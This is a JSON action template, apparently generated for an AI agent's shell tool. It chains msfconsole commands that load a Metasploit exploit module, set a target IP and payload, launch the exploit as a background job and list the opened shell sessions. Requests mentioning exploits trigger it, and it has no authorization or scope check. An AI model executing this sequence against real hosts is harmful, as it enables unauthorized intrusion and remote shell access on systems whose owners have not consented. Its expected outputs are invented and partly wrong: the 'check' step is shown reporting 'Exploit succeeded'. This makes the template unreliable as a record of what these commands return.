{
  "name": "msfconsole_exploit_module_execution",
  "description": "Execute Metasploit exploit modules against vulnerable targets using msfconsole",
  "pattern": "msf.*exploit|metasploit.*attack|exploit.*module|msfconsole.*use",
  "parameters": ["exploit_path", "target_ip", "payload"],
  "sequence": [
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use {{exploit_path}}; show options'"]}, "expected_output": {"type": "string", "example": "Module options ({{exploit_path}}):\nRHOST - yes - The target address\nRPORT - yes - The target port\nLHOST - no - The listen address\nPayload options available: 234"}},
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use {{exploit_path}}; set RHOSTS {{target_ip}}; set PAYLOAD {{payload}}; show options'"]}, "expected_output": {"type": "string", "example": "RHOSTS => {{target_ip}}\nPAYLOAD => {{payload}}\nAll required options set"}},
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use {{exploit_path}}; set RHOSTS {{target_ip}}; set PAYLOAD {{payload}}; check'"]}, "expected_output": {"type": "string", "example": "The target appears to be vulnerable - Exploit succeeded"}},
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'use {{exploit_path}}; set RHOSTS {{target_ip}}; exploit -j'"]}, "expected_output": {"type": "string", "example": "Exploit running as background job 0\nExploit completed, session 1 opened"}},
    {"action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "msfconsole -q -x 'sessions -l'"]}, "expected_output": {"type": "string", "example": "Active sessions: 1\nId  Name  Type  Information  Connection\n1   -     shell cmd/unix   {{target_ip}}:4444"}}
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
